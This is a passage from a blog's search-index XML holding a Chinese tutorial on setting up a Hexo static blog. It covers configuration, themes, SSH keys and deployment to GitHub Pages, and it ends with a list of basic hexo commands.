alt=""><br>node_modules：是依赖包<br><br>public：存放的是生成的页面<br><br>scaffolds：命令生成文章等的模板<br><br>source：用命令创建的各种文章<br><br>themes：主题<br><br>_config.yml：整个博客的配置<br><br>db.json：source解析所得到的<br><br>package.json：项目所需模块项目的配置信息<br></li></ol><p>干好之后就开始配置你的hexo了，打开_config.yml配置文件,进行更改。<br><br><img src="https://i.imgur.com/37KDIEA.png" alt=""><br>然后下载你喜欢的模板进行替换，模板在hexo官网自己挑选下载到themes里面。修改根目录下的_config.yml找到themes进行模板替换<br><br>替换完之后预览一下效果。<br><br>hexo clean<br><br>hexo generate<br><br>hexo server<br><br>打开浏览器访问：<a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a><br><br>我这里的主题是仙人掌大法<br><br><img src="https://i.imgur.com/i3Fumv1.png" alt=""><br>做好这些以后，你得创建ssh<br><br>在gitbash中输入：ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com" target="_blank" rel="noopener">youremail@example.com</a>，生成ssh。然后按下图的方式找到id_rsa.pub文件的内容。<br><br>然后去github找到setting添加ssh key。<br><br><img src="https://i.imgur.com/tNcZBqg.png" alt=""><br>在gitbash中验证是否添加成功：ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><br>完成下一步你就成功啦！<br><br>安装deploy<br><br>npm install hexo-deployer-git –save<br><br>安装之后，去修改你的_config.yml下的deploy。<br>类似于这样子的：<br></p><pre><code>deploy:      type:git    repository:git@github.com:422926799/422926799.github.io.git    branch:master</code></pre><p>弄好之后执行：hexo d -g 即可部署你的博客。访问<a href="https://xxx.github.io就能看到了。" target="_blank" rel="noopener">https://xxx.github.io就能看到了。</a><br>hexo的基本命令：</p><pre><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo p == hexo publishhexo g == hexo generate#生成hexo s == hexo server #启动服务预览hexo d == hexo deploy#部署hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存 网页正常情况下可以忽略此条命令hexo g #生成静态网页hexo d #开始部署hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #将.deploy目录部署到GitHubhexo new [layout] &lt;title&gt;hexo new photo &quot;My Gallery&quot;hexo new &quot;Hello World&quot; --lang tw</code></pre><p><strong><br>转载请注明：来只422926799.github.io。</strong></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
